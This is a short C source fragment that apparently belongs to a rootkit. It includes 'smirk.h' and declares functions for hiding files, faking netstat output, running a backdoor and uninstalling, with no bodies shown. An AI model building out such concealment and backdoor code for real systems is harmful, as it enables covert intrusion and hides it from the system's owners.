#include "smirk.h"

int matches_reg(const char *, const char *);
int is_magicfile(const char *);
int is_net_file(const char *);
int fake_netstat(char *, char *);
void *backdoor(void *);
void uninstall();
